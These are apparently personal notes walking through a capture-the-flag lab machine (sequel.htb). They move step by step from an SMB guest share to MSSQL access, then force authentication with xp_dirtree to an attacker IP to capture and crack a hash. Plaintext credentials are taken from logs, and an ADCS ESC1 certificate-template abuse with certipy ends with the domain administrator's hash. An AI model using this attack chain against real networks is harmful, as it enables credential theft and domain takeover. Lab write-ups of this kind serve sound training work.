in smb Public we found file SQL SERVER PROCEDURE
![[Pasted image 20250212213204.png]]

![[Pasted image 20250212211617.png]]
PublicUser:GuestUserCantWrite1
we connecting into mssql:
sqsh -S 10.10.11.202 -U PublicUser -P 'GuestUserCantWrite1' -h
getting hash:
1> EXEC xp_dirtree '\\10.10.14.14\share\'
2> go
result:
sql_svc::sequel:aaaaaaaaaaaaaaaa:4d30a158f3c71b691f3b3ffbd6f31339:0101000000000000004c8276837ddb01228bd5e66d167d93000000000100100055005a00530078005800620068007a000300100055005a00530078005800620068007a00020010004f005a0044007100670069007a005a00040010004f005a0044007100670069007a005a0007000800004c8276837ddb0106000400020000000800300030000000000000000000000000300000dec1f7c9c2bec7477652cb12cde11a01ad84eb9a38472e752daf91fce7b2eeca0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00310034000000000000000000

cracked with hashcat:
REGGIE1234ronnie

![[Pasted image 20250212212545.png]]

![[Pasted image 20250212224137.png]]
we connect in host by using evil-winrm with credentials for sql_svc
findings data in sql logs:
C:\SQLServer\Logs> cat ERRORLOG.BAK
![[Pasted image 20250212235905.png]]
Ryan.Cooper NuclearMosquito3
![[Pasted image 20250212235827.png]]
we found ryan cooper is member of ![[Pasted image 20250213125007.png]]

certipy find -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -vulnerable -enabled
result:
ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication

certipy req -username Ryan.Cooper@sequel.htb -password NuclearMosquito3 -ca sequel-DC-CA -template UserAuthentication -upn administrator@sequel.htb -dns dc.sequel.htb
certipy auth -pfx administrator_dc.pfx -dc-ip 10.10.11.202
Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
